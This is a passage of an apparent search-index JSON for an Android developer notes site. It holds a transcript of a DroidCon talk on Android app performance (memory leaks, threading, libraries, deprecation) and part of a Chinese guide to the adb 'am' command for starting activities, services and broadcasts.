are the most prominent and annoying. To avoid these, learn the app components life cycle. What are the flags around Activities, what are fragments, what are stated fragments, what is task, and what are flags. Read documentation and add simple logs on callbacks, playing around with flags. Please work with the framework and not against it. Framework components have a purpose, which are specific semantics, and use when these semantics are desired. There\u2019s a reason we have broadcast receivers. There is a reason a service is different from an activity. In general, avoid over-engineering. Unfortunately, I have seen too many cases when I talk to companies about their architecture, and they just create unnecessary layers of mud above the framework components. Don\u2019t do it. Keep it simple. Then, your app performs better, and other good things. I\u2019m also often asked, \u201cwhat it better? Should I pick Picasso or Glide? Should I pick Volley or OkHttp?\u201d And usually there is no right answer or 100% correct answer. However, the following checklist is something that I\u2019m using when I\u2019m discussing with the companies what they should do in terms of architecture. Make sure it solves your problem. Make sure it plays nicely with your current dependencies. Please know dex method count. Nowadays it\u2019s less of a problem since we introduced the multi-dex flag, however, it\u2019s always good to be aware of it. Please check the dependencies. The last thing that you want is a dependency clash. You have version Z of some library, but the third-party library requires a different version. This is what is called, at least in the Windows world, the DLL Hell. I guess in the Java world its more of a Jar hell. Try to avoid it. Know the maintenance. All in all, speaking of architecture and design, the best idea is to design your app sleeping most of the time and to be extremely responsive when it\u2019s awake. For me, the best app is the app that gets out of my way in less than 10 seconds. I thus recommend you to be consistent, as consistency is the cornerstone of every architecture. Make sure you can get people on board quickly. It always helps to have somebody or someone who is experienced in that architecture before, and in general please pick your dependencies wisely. \u539f\u6587\u94fe\u63a5\uff1a https://academy.realm.io/posts/droidcon-farber-improving-android-app-performance/","title":"10 Ways to Improve Your Android App's Performance"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#10-ways-to-improve-your-android-apps-performance","text":"Everyone knows how important performance is for the success of an app, but how do you get your app running at peak performance? In his talk at DroidCon NYC 2015, Boris Farber brings his wealth of experience working with Android APIs at Google to help you avoid ten common pitfalls and keep your app running as fast as humanly possible. Learn how to avoid falling victim to long launch times and bad scrolling, in order to create a responsive app with a smoother user experience. Save the date for Droidcon SF in March \u2014 a conference with best-in-class presentations from leaders in all parts of the Android ecosystem.","title":"10 Ways to Improve Your Android App's Performance"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#introduction-000","text":"Hi, my name is Boris; I am a Developer Advocate at Google, and I\u2019m focusing on performance-heavy apps. This post is the best practices and the mistakes I have seen while consulting partners on their Android apps. If you have a small app, read on, but you will likely only need this information when your app gets larger. The rules of thumb that I have found from working with data intensive Android apps. Usually, the app that I am looking at has a long launch time, janky scrolling, or even in the worst case, unresponsiveness. We are going to see a bunch of ways how can we make those things better and faster because, at the end of the day, we all want to be successful.","title":"Introduction (0:00)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#activity-leaks-117","text":"Our first friend in things that we need to fix is Activity leaks, and let\u2019s see how they happen. Activity leaks, or memory leaks in general, are extremely dangerous. Why do they happen? If we hold the reference in our code to an unused Activity, we hold all of the Activity\u2019s layout and, in turn, all of its views. That results in many, many pixels you don\u2019t want to store in memory. Another really problematic thing is keeping static references. Don\u2019t forget, both Activities and fragments have a life cycle. Once we have a static reference, this Activity, or fragment, will not be garbage collected. This is why static references are dangerous, they become dangling pointers. m_staticActivity = staticFragment.getActivity() I have seen this code too many times, unfortunately, and on one occasion it took two weeks of my life to understand why the app was crashing at unexpected times. Not my favorite activity to run after those bugs. I hope it is not yours. We start with the first, easiest way to make a memory leak, which is by leaking listeners. Say we have the following code, public class LeakActivity extends Activity and guess what? We have some NastyManager , which is unfortunately a singleton, and we add activity to this manager by addListener(this) . public class LeakActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); NastyManager.getInstance().addListener(this); } } If you want to see more details in the blog post that I posted in Android Developers, maybe three, four weeks ago, what happens is NastyManager holds our Activity. So, the Activity might not be presented, but it will be in memory, and this is a really, really bad idea. Let me show you how to fix it pretty easily. @Override public void onDestroy() { super.onDestroy(); NastyManager.getInstance().removeListener(this); } onDestroy , for our Activity, we just unregister ourselves. Of course, we have a better discussion, should we use singletons in the first place? Usually, we shouldn\u2019t, but sometimes it\u2019s the only solution. That\u2019s why software engineering is interesting. We have a tradeoff, and we have a design. So please, don\u2019t forget to remove your listeners. In order for us deeper to understand why these problems happen, you need to remember the structure. What does it mean to be an inner class? We have a Handler, which we\u2019ll look at shortly, which is an inner non-static class, to the scoping class, which is Activity. As we are going to see shortly, as long as Handler alive, the bounding Activity is alive. If you don\u2019t believe me, try to read the JVM spec, this is funny. Here is another memory leak. To represent the example, we have a Activity, and inside we have a Handler. public class MainActivity extends Activity { //... Handler handler; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); //... handler = new Handler() { @Override public void handleMessage(Message msg) { } } } Excellent way to communicate things. Handler, asynchronous communication, thread-safe, all good things. What happens if you have the following code? handler.postDelayed next hour. What does it mean? It means, as long as a Handler has a message, it\u2019s alive. And if a Handler is alive, it\u2019s enclosing Activity is alive, even though we might not need it but we pay for the memory. This is what we call a memory leak. Let\u2019s see how we fix it. I have a confession to make, the fix is a little bit tricky. We really recommend using WeakReference . What\u2019s a WeakReference ? WeakReference , if it\u2019s the only reference to underlying object, the garbage collector will clean it. That\u2019s it \u2013 truly simple. Here, We declare a Handler with a WeakReference , so if the Handler is alive and we don\u2019t need Activity, and the WeakReference that the Handler holds is the only reference. The Activity is cleaned. I admit this fix is a little bit tricky. This is the ecosystem that we are living in. private static class MyHandler extends Handler { private final WeakReference<MainActivity> mActivity; // ... public MyHandler(MainActivity activity) { mActivity = new WeakReference<MainActivity>(activity); //... } @Override public void handleMessage(Message msg) { } //... } To recap, we have an inner class, like Handler. Inner non-static class can\u2019t live in isolation from the scoping class, which is Activity. So please, when you come back to your code, take a look at all your inner classes and make sure that you don\u2019t have a memory leak there. You and your users will thank you later. In general, please prefer static to non-static inner classes. Basically the difference is non-static inner class is not bounded to its enclosing class, such as Activity. Note that both classes, Handler and Activity, have a different lifetime. This is one of the reasons for the most, most annoying bugs that I see. Most of the time I am trying to make you all successful on Android, but I also work with companies trying to sort out their problems, and many of them come to me with memory leaks.","title":"Activity Leaks (1:17)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#what-can-you-do-about-activity-leaks-837","text":"Please remove away static references. Consider using event bus to decoup our listeners from senders. Please unregister your listeners. Please prefer static inner classes to non-static ones. Please do code reviews. Based on my personal experience, the code reviews are so far the most effective way to find memory leaks. Understand your application structure. Use tools such as MAT, Eclipse Analyzer, LeakCanary. Print logs on callbacks.","title":"What Can You Do About Activity Leaks? (8:37)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#scrolling-1005","text":"The secret for effective scrolling is as follows: use UI thread only for UI. This alone would solve 99% of your problems. Never do the following on UI thread: Never load images. Never do networking calls. Never parse JSON. Never access databases. There are means to do them. Some of them even fast. For images, networking, JSON, use libraries. There are a lot of community solutions, and some of the best presenters are even presenting in this Droidcon conference. For database access, consider using Loader, who actually do batch updates to databases, and to make you focus on what\u2019s important in your app.","title":"Scrolling (10:05)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#images-1126","text":"As far as image libraries go, the following typically provide the required functionality, based on our experience working with leading companies: Glide , Picasso , Fresco . Just know that they have all different design trade-offs, especially around the large images count.","title":"Images (11:26)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#memory-1213","text":"We managed to convince ourselves that the bitmaps are tricky, basically because of their large size and fragmented heap. When I was responsible for an app with a lot of images on the pre-4.0 devices, that made life hard. Also, memory management is tricky. Some of the stuff, it\u2019s better to put in file, and some of the stuff it\u2019s better to keep in memory. Please note, we have the class LRUCache which is an efficient cache implementation.","title":"Memory (12:13)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#networking-1254","text":"First, the problem with Java networking, which made its way into Android, is the tricky APIs. In case you don\u2019t know, many java.net API calls are blocking. This is another excellent reason to not do networking on the UI thread. Remember that stream calls are blocking, and to make things even more interesting, equals of the URL class result in DNS call \u2013 this is time that you are paying. Use libraries, or any other threading solution that fits to your program. The hard part about the networking is they\u2019re doing Async Http. If I remember correctly from Android 4.4, OkHttp is the part of a Android sources, however, if you feel that you need the latest version of OkHttp with some stuff that hasn\u2019t made its way into the official Android, consider bundling your own. There is another public library which is made by Google, Volley . There is a excellent library made by Square called Retrofit for your REST calls, all the solutions you have to make your app network-friendly successful.","title":"Networking (12:54)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#large-json-1435","text":"This is another component of things you shouldn\u2019t do on UI thread because parsing large JSON has a performance effect, especially if converted to a class with a lot of getters and setters. What we have found so far is if you have a small JSON, the GSON , also made by Google, gives the best result.However, I consider a rule of thumb, maybe less than 500k could be small, anything larger could be considered as large. And also, don\u2019t forget, this is a moving target. On a strong device such as Nexus 6, something we consider as large is small, but if your app has to support previous devices you should take it with a grain of salt. For large JSON, I would say the best to use or the fastest to use are Jackson and Instagram JSON Parser . They did really interesting work of generating the stream parser code. From company feedback, ig-json-parser gives the best results so far. Looper.myLooper() == Looper.getMainLooper() is the code you can use to make sure you are not on the UI thread.","title":"Large JSON (14:35)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#what-can-we-do-to-speed-up-our-scrolling-1656","text":"Please keep UI thread only for UI. Understand concurrency APIs. Please use libraries. Use Loaders The reason to use libraries is because the code is tricky. That doesn\u2019t mean you can\u2019t write a good library by yourself, however, if I were to choose should I focus on something which exists whether, say, providing more value to my business, I will definitely go for providing more value to the business. Developing a library is something which is expensive, and if you have libraries right off the shelf, consider using them. They are supported, maintained and have a community behind them.","title":"What can we do to speed up our scrolling? (16:56)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#concurrency-apis-1800","text":"I find these really important to understand in order to make your app fast and responsive. People including myself unfortunately forget that Service methods run on UI thread. Please consider using IntentService , AsyncTask , Executors , Handlers and Loopers . Let\u2019s focus on the trade-offs of the first three.","title":"Concurrency APIs (18:00)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#intentservice-1907","text":"In my previous company, I used the IntentService to perform uploading to the server. IntentService is a single-threaded, simple, one job at a time. We don\u2019t have any job system, meaning we can\u2019t keep track for jobs, and we have essentially no normal way to stop it. If you have some large operation that doesn\u2019t touch UI, consider using it. What I did in my previous company was doing upload to one IntentService and showing a notification icon once I\u2019m done.","title":"IntentService (19:07)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#asynctask-1956","text":"The AsyncTask is a solution if you have a thing that you need, or basically something that you don\u2019t care about the result of outside the UI. However, please note that even though AsyncTask is relatively easy, it has some dark corners. Activity life-cycles, especially during rotation, need to be closed and dismissed. Otherwise it could cause memory leaks, and as we have seen on our first bullet, Activity memory leaks are not fun. Another thing that I have problems with is it was changed rapidly around the Honeycomb and Gingerbread. As a result, I forked the AsyncTask sources from the Android source tray, bundled it in my APK, and that\u2019s it. Sometimes, this could be solution.","title":"AsyncTask (19:56)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#executor-framework-2111","text":"This is another friend in the concurrency APIs that we got from Java 6 and on, this is essentially a thread pool managed by the system, which has callbacks, futures and mostly I use it for MapReduce tasks. Meaning, if you have a big job and you want to break it into small pieces and give each piece a thread, the Executor Framework could be your best solution. For instance, I used it when I wrote my open source git project three or four years ago. Even though it was developed on Nexus S, in the dark ages, when we ran it on Nexus 6, it performed extremely well.","title":"Executor Framework (21:11)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#what-can-you-do-about-concurrency-apis-2207","text":"Please learn and understand the APIs and tradeoffs. Please make sure that you map the correct solution to the right problem. Understand what your problems are and see, which of the API that I presented before, can defeat the best. Please refactor your code","title":"What can you do about concurrency APIs? (22:07)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#deprecation-2242","text":"We all know what deprecation is and why we should avoid it. Not only is deprecation bad, system abuse is bad. Here are some classic examples: Please don\u2019t call private APIs by reflection. Please don\u2019t call private native methods from the NDK and C level. Please don\u2019t just Runtime.exec to communicate with processes. adb shell am to communicate with other processes is not something we want to support. I have seen zillions of bugs, especially when we introduced Android L, when we blocked this feature. Abusing private APIs, which are meant to be private, is bound to lead to failure. Deprecation means that some API will be removed and, usually one or two days before the major release, your app will not work. To make things even worse, sometimes if you are dependent on the old version of a library, there is no way to update both APIs and tools. Unfortunately, I saw a company whose whole application was dependent on a library that could only be built with Android 3.0. Android 3.0 was a long, long, long time ago. This is a bad thing. Please don\u2019t do it. Most of the time there is a compelling reason for us to deprecate APIs to improve security, correctness, and of course, performance. To avoid issues with deprecations: Know and use proper APIs. Refactor your dependencies. Don\u2019t abuse the system. Update your dependencies and tools. Newer is better. Prefer Toolbar to ActionBar, and prefer RecyclerView, especially for animations, because it\u2019s optimized for that. As a latest and greatest example, if you don\u2019t know, but we removed the Apache Http connection at M. By the way, it\u2019s still available as a gradle dependency. Please use HttpURLConnection. It has a simpler API, smaller size, transparent compression, better response caching, and other cool things.","title":"Deprecation (22:42)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#architecture-2703","text":"Bugs around a lifecycle in architecture are the most prominent and annoying. To avoid these, learn the app components life cycle. What are the flags around Activities, what are fragments, what are stated fragments, what is task, and what are flags. Read documentation and add simple logs on callbacks, playing around with flags. Please work with the framework and not against it. Framework components have a purpose, which are specific semantics, and use when these semantics are desired. There\u2019s a reason we have broadcast receivers. There is a reason a service is different from an activity. In general, avoid over-engineering. Unfortunately, I have seen too many cases when I talk to companies about their architecture, and they just create unnecessary layers of mud above the framework components. Don\u2019t do it. Keep it simple. Then, your app performs better, and other good things. I\u2019m also often asked, \u201cwhat it better? Should I pick Picasso or Glide? Should I pick Volley or OkHttp?\u201d And usually there is no right answer or 100% correct answer. However, the following checklist is something that I\u2019m using when I\u2019m discussing with the companies what they should do in terms of architecture. Make sure it solves your problem. Make sure it plays nicely with your current dependencies. Please know dex method count. Nowadays it\u2019s less of a problem since we introduced the multi-dex flag, however, it\u2019s always good to be aware of it. Please check the dependencies. The last thing that you want is a dependency clash. You have version Z of some library, but the third-party library requires a different version. This is what is called, at least in the Windows world, the DLL Hell. I guess in the Java world its more of a Jar hell. Try to avoid it. Know the maintenance. All in all, speaking of architecture and design, the best idea is to design your app sleeping most of the time and to be extremely responsive when it\u2019s awake. For me, the best app is the app that gets out of my way in less than 10 seconds. I thus recommend you to be consistent, as consistency is the cornerstone of every architecture. Make sure you can get people on board quickly. It always helps to have somebody or someone who is experienced in that architecture before, and in general please pick your dependencies wisely. \u539f\u6587\u94fe\u63a5\uff1a https://academy.realm.io/posts/droidcon-farber-improving-android-app-performance/","title":"Architecture (27:03)"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/","text":"Am\u547d\u4ee4\u7528\u6cd5 \u57fa\u4e8eAndroid 6.0\u7684\u6e90\u7801\u5256\u6790\uff0c \u5206\u6790am\u547d\u4ee4 \u4e00\u3001\u6982\u8ff0 \u4f5c\u4e3a\u4e00\u540d\u5f00\u53d1\u8005\uff0c\u76f8\u4fe1\u5bf9adb\u6307\u4ee4\u4e00\u5b9a\u4e0d\u4f1a\u964c\u751f\u3002\u90a3\u4e48\u5728\u624b\u673a\u8fde\u63a5adb\u540e\uff0c\u53ef\u901a\u8fc7am\u547d\u4ee4\u505a\u5f88\u591a\u64cd\u4f5c\uff1a \u62e8\u6253\u7535\u8bdd \u901a\u8fc7adb\uff0c\u53ef\u4ee5\u76f4\u63a5\u62e8\u6253\u7535\u8bdd10086 adb shell am start -a android.intent.action.CALL -d tel:10086 \u6253\u5f00\u7f51\u7ad9 \u6bd4\u5982\uff0c\u6253\u5f00\u7f51\u7ad9www.gityuan.com adb shell am start -a android.intent.action.VIEW -d http://gityuan.com \u542f\u52a8\u5e94\u7528 \u6bd4\u5982\uff0c\u542f\u52a8\u5305\u540d\u4e3acom.gityuan.app\uff0c\u4e3bActivity\u4e3a .MainActivity \uff0c\u4e14extra\u6570\u636e\u4ee5\u201dwebsite\u201d\u4e3akey, \u201cgityuan.com\u201d\u4e3avalue\u3002\u901a\u8fc7java\u4ee3\u7801\u8981\u5b8c\u6210\u8be5\u529f\u80fd\u867d\u7136\u4e0d\u590d\u6742\uff0c\u4f46\u81f3\u5c11\u9700\u8981\u4e00\u4e2aandroid\u73af\u5883\uff0c\u800c\u901a\u8fc7adb\u7684\u65b9\u5f0f\uff0c\u53ea\u9700\u8981\u5728adb\u7a97\u53e3\uff0c\u8f93\u5165\u5982\u4e0b\u547d\u4ee4\u4fbf\u53ef\u5b8c\u6210: am start -n com.gityuan.app/.MainActivity -es website gityuan.com am\u547d\u4ee4\u8fd8\u53ef\u4ee5\u542f\u52a8Service\u3001Broadcast\uff0c\u6740\u8fdb\u7a0b\uff0c\u76d1\u63a7\u7b49\u529f\u80fd\uff0c\u8fd9\u4e9b\u529f\u80fd\u90fd\u975e\u5e38\u4fbf\u6377\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u63a5\u4e0b\u6765\u8bb2\u8ff0\u5173\u4e8eam\u66f4\u591a\u66f4\u8be6\u7ec6\u7684\u529f\u80fd\u3002 \u4e8c\u3001Am\u547d\u4ee4 2.1 \u547d\u4ee4\u5217\u8868 \u547d\u4ee4\u683c\u5f0f\u5982\u4e0b\uff1a am [subcommand] [options] \u547d\u4ee4\u5217\u8868\u5982\u4e0b\uff1a \u547d\u4ee4 \u529f\u80fd \u5b9e\u73b0\u65b9\u6cd5 am start [options ] <INTENT > \u542f\u52a8Activity startActivityAsUser am startservice <INTENT > \u542f\u52a8Service startService am stopservice <INTENT > \u505c\u6b62Service stopService am broadcast <INTENT > \u53d1\u9001\u5e7f\u64ad broadcastIntent am kill <PACKAGE > \u6740\u6307\u5b9a\u540e\u53f0\u8fdb\u7a0b killBackgroundProcesses am kill-all \u6740\u6240\u6709\u540e\u53f0\u8fdb\u7a0b killAllBackgroundProcesses am force-stop <PACKAGE > \u5f3a\u6740\u8fdb\u7a0b forceStopPackage am hang \u7cfb\u7edf\u5361\u4f4f hang am restart \u91cd\u542f restart am bug-report \u521b\u5efabugreport requestBugReport am dumpheap <pid > <file > \u8fdb\u7a0bpid\u7684\u5806\u4fe1\u606f\u8f93\u51fa\u5230file dumpheap am send-trim-memory <pid > <level > \u6536\u7d27\u8fdb\u7a0b\u7684\u5185\u5b58 setProcessMemoryTrimLevel am monitor \u76d1\u63a7 MyActivityController.run am\u547d\u4ee4\u5b9e\u7684\u5b9e\u73b0\u65b9\u5f0f\u5728Am.java\uff0c\u6700\u7ec8\u51e0\u4e4e\u90fd\u662f\u8c03\u7528 ActivityManagerService \u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u5b8c\u6210\u3002 \u6bd4\u5982\u547d\u4ee4 am start -a android.intent.action.VIEW -d http://gityuan.com \uff0c \u542f\u52a8Acitivty\u6700\u7ec8\u8c03\u7528\u7684\u662fActivityManagerService\u7c7b\u7684startActivityAsUser()\u65b9\u6cd5\u6765\u5b8c\u6210\u7684\u3002 \u518d\u6bd4\u5982 am kill-all \u547d\u4ee4\uff0c\u6700\u7ec8\u7684\u5b9e\u73b0\u5de5\u4f5c\u662f\u7531ActivityManagerService\u7684killBackgroundProcesses()\u65b9\u6cd5\u5b8c\u6210\u7684\u3002 \u63a5\u4e0b\u6765\uff0c\u8bf4\u8bf4 [options ]\u548c <INTENT >\u53c2\u6570\u542b\u4e49\u548c\u4f7f\u7528\u3002 2.2 Activity\u542f\u52a8\u547d\u4ee4 \u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u542f\u52a8Activity\u547d\u4ee4 am start [options] <INTENT> \u4f7f\u7528options\u53c2\u6570\uff0c\u63a5\u4e0b\u6765\u5217\u4e3eActivity\u547d\u4ee4\u7684[options]\u53c2\u6570\uff1a -D: \u5141\u8bb8\u8c03\u8bd5\u529f\u80fd -W: \u7b49\u5f85app\u542f\u52a8\u5b8c\u6210 -R <COUNT >: \u91cd\u590d\u542f\u52a8Activity COUNT\u6b21 -S: \u542f\u52a8activity\u4e4b\u524d\uff0c\u5148\u8c03\u7528forceStopPackage()\u65b9\u6cd5\u5f3a\u5236\u505c\u6b62app. \u2013opengl-trace: \u8fd0\u884c\u83b7\u53d6OpenGL\u51fd\u6570\u7684trace \u2013user <USER_ID > | current: \u6307\u5b9a\u7528\u6237\u6765\u8fd0\u884cApp,\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7528\u6237\u3002 \u2013start-profiler <FILE >: \u542f\u52a8profiler\uff0c\u5e76\u5c06\u7ed3\u679c\u53d1\u9001\u5230 <FILE >; -P <FILE >: \u7c7b\u4f3c \u2013start-profiler\uff0c\u4e0d\u540c\u7684\u662f\u5f53app\u8fdb\u5165idle\u72b6\u6001\uff0c\u5219\u505c\u6b62profiling \u2013sampling INTERVAL: \u8bbe\u7f6eprofiler \u53d6\u6837\u65f6\u95f4\u95f4\u9694\uff0c\u5355\u4f4dms; \u542f\u52a8Activity\u7684\u5b9e\u73b0\u539f\u7406\uff1a \u5b58\u5728-W\u53c2\u6570\u5219\u8c03\u7528startActivityAndWait()\u65b9\u6cd5\u6765\u8fd0\u884c\uff0c\u5426\u5219startActivityAsUser()\u3002 2.3 trim-memory\u547d\u4ee4 \u6536\u7d27\u5185\u5b58\u547d\u4ee4 am send-trim-memory <pid> <level> \u4f8b\u5982\uff1a \u5411pid=12345\u7684\u8fdb\u7a0b\uff0c\u53d1\u51falevel=RUNNING_LOW\u7684\u6536\u7d27\u5185\u5b58\u547d\u4ee4 am send-trim-memory 12345 RUNNING_LOW\u3002 \u90a3\u4e48level\u53d6\u503c\u8303\u56f4\u4e3a\uff1a HIDDEN\u3001RUNNING_MODERATE\u3001BACKGROUND\u3001RUNNING_LOW\u3001MODERATE\u3001RUNNING_CRITICAL\u3001COMPLETE\u3002 2.4 Intent\u53c2\u6570 Intent\u7684\u53c2\u6570\u548cflags\u8f83\u591a\uff0c\u672c\u6587\u4e3a\u65b9\u4fbf\u8d77\u89c1\uff0c\u5206\u4e3a3\u79cd\u7c7b\u578b\u53c2\u6570\uff0c\u5e38\u7528\u53c2\u6570\uff0cExtra\u53c2\u6570\uff0cFlags\u53c2\u6570\u3002 2.4.1 \u5e38\u7528\u53c2\u6570 -a <ACTION> : \u6307\u5b9aIntent action\uff0c \u5b9e\u73b0\u539f\u7406Intent.setAction()\uff1b -n <COMPONENT> : \u6307\u5b9a\u7ec4\u4ef6\u540d\uff0c\u683c\u5f0f\u4e3a{\u5305\u540d}/.{\u4e3bActivity\u540d}\uff0c\u5b9e\u73b0\u539f\u7406Intent.setComponent(\uff09\uff1b -d <DATA_URI> : \u6307\u5b9aIntent data URI -t <MIME_TYPE> : \u6307\u5b9aIntent MIME Type -c <CATEGORY> [-c <CATEGORY>] ...] :\u6307\u5b9aIntent category\uff0c\u5b9e\u73b0\u539f\u7406Intent.addCategory() -p <PACKAGE> : \u6307\u5b9a\u5305\u540d\uff0c\u5b9e\u73b0\u539f\u7406Intent.setPackage(); -f <FLAGS> : \u6dfb\u52a0flags\uff0c\u5b9e\u73b0\u539f\u7406Intent.setFlags(int )\uff0c\u7d27\u63a5\u7740\u7684\u53c2\u6570\u5fc5\u987b\u662fint\u578b\uff1b \u5b9e\u4f8b am start -a android.intent.action.VIEW am start -n com.gityuan.app/.MainActivity am start -d content://contacts/people/1 am start -t image/png am start -c android.intent.category.APP_CONTACTS 2.4.2 Extra\u53c2\u6570 (1). \u57fa\u672c\u7c7b\u578b | \u53c2\u6570 | -e/-es | -esn | -ez | -ei | -el | -ef | -eu | -ecn | | \u7c7b\u578b | String | (String)null | boolean | int | long | float | uri | component | \u6bd4\u5982\u53c2\u6570es\u662fExtra String\u9996\u5b57\u6bcd\u7b80\u79f0\uff0c\u5b9e\u4f8b\uff1a am start -n com.gityuan.app/.MainActivity -es website gityuan.com \u6b64\u5904 -es website gityuan.com \uff0c\u7b49\u4ef7\u4e8eIntent.putExtra(\u201cwebsite\u201d, \u201cgityuan.com\u201d); (2). \u6570\u7ec4\u7c7b\u578b | \u53c2\u6570 | -esa | -eia | -ela | -efa | | \u6570\u7ec4\u7c7b\u578b | String[] | int[] | long[] | float[] | \u6bd4\u5982\u53c2\u6570eia\uff0c\u662fExtra int array\u9996\u5b57\u6bcd\u7b80\u79f0\uff0c\u591a\u4e2avalue\u503c\u4e4b\u95f4\u4ee5\u9017\u53f7\u9694\u5f00\uff0c\u5b9e\u4f8b\uff1a am start -n com.gityuan.app/.MainActivity -ela weekday 1,2,3,4,5 \u6b64\u5904 -ela weekday 1,2,3,4,5 \uff0c\u7b49\u4ef7\u4e8eIntent.putExtra(\u201cweekday\u201d, new int[]{1,2,3,4,5}); (3). ArrayList\u7c7b\u578b | \u53c2\u6570 | -esal | -eial | -elal | -efal | | List\u7c7b\u578b | String | int | long | float | \u6bd4\u5982\u53c2\u6570efal\uff0c\u662fExtra float Array List\u9996\u5b57\u6bcd\u7b80\u79f0\uff0c\u591a\u4e2avalue\u503c\u4e4b\u95f4\u4ee5\u9017\u53f7\u9694\u5f00\uff0c\u5b9e\u4f8b\uff1a am start -n com.gityuan.app/.MainActivity -efal nums 1.2,2.2 \u6b64\u5904 -efal nums 1.2,2.2 \uff0c\u7b49\u4ef7\u4e8e\u5148\u6784\u9020ArrayList\u53d8\u91cf\uff0c\u518d\u901a\u8fc7putExtra\u653e\u5165\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002 2.4.3 Flags\u53c2\u6570 \u5728\u53c2\u6570\u7c7b\u578b1\u4e2d\uff0c\u63d0\u5230\u6709 -f <FLAGS> \uff0c\u662f\u901a\u8fc7 Intent.setFlags(int ) \u65b9\u6cd5\uff0c\u6765\u8bbe\u7f6eIntent\u7684flags.\u672c\u5c0f\u8282\u4e5f\u662f\u5173\u4e8eflags\uff0c\u662f\u901a\u8fc7 Intent.addFlags(int ) \u65b9\u6cd5\u3002\u5982\u4e0b\u6240\u793a\uff0c\u6240\u6709\u7684flags\u53c2\u6570\u3002 [--grant-read-uri-permission] [--grant-write-uri-permission] [--grant-persistable-uri-permission] [--grant-prefix-uri-permission] [--debug-log-resolution] [--exclude-stopped-packages] [--include-stopped-packages] [--activity-brought-to-front] [--activity-clear-top] [--activity-clear-when-task-reset] [--activity-exclude-from-recents] [--activity-launched-from-history] [--activity-multiple-task] [--activity-no-animation] [--activity-no-history] [--activity-no-user-action] [--activity-previous-is-top] [--activity-reorder-to-front] [--activity-reset-task-if-needed] [--activity-single-top] [--activity-clear-task] [--activity-task-on-home] [--receiver-registered-only] [--receiver-replace-pending] \u4f8b\u5982\uff0c\u53d1\u9001action=\u201dbroadcast.demo\u201d\u7684\u5e7f\u64ad\uff0c\u5e76\u4e14\u5bf9\u4e8eforceStopPackage()\u7684\u5e94\u7528\u4e0d\u5141\u8bb8\u63a5\u6536\u8be5\u5e7f\u64ad\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a am broadcast -a broadcast.demo --exclude-stopped-packages \u539f\u6587\u94fe\u63a5\uff1a http://gityuan.com/2016/02/27/am-command/","title":"Am\u547d\u4ee4\u7528\u6cd5"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#am","text":"\u57fa\u4e8eAndroid 6.0\u7684\u6e90\u7801\u5256\u6790\uff0c \u5206\u6790am\u547d\u4ee4","title":"Am\u547d\u4ee4\u7528\u6cd5"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#_1","text":"\u4f5c\u4e3a\u4e00\u540d\u5f00\u53d1\u8005\uff0c\u76f8\u4fe1\u5bf9adb\u6307\u4ee4\u4e00\u5b9a\u4e0d\u4f1a\u964c\u751f\u3002\u90a3\u4e48\u5728\u624b\u673a\u8fde\u63a5adb\u540e\uff0c\u53ef\u901a\u8fc7am\u547d\u4ee4\u505a\u5f88\u591a\u64cd\u4f5c\uff1a","title":"\u4e00\u3001\u6982\u8ff0"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#_2","text":"\u901a\u8fc7adb\uff0c\u53ef\u4ee5\u76f4\u63a5\u62e8\u6253\u7535\u8bdd10086 adb shell am start -a android.intent.action.CALL -d tel:10086","title":"\u62e8\u6253\u7535\u8bdd"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#_3","text":"\u6bd4\u5982\uff0c\u6253\u5f00\u7f51\u7ad9www.gityuan.com adb shell am start -a android.intent.action.VIEW -d http://gityuan.com","title":"\u6253\u5f00\u7f51\u7ad9"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#_4","text":"\u6bd4\u5982\uff0c\u542f\u52a8\u5305\u540d\u4e3acom.gityuan.app\uff0c\u4e3bActivity\u4e3a .MainActivity \uff0c\u4e14extra\u6570\u636e\u4ee5\u201dwebsite\u201d\u4e3akey, 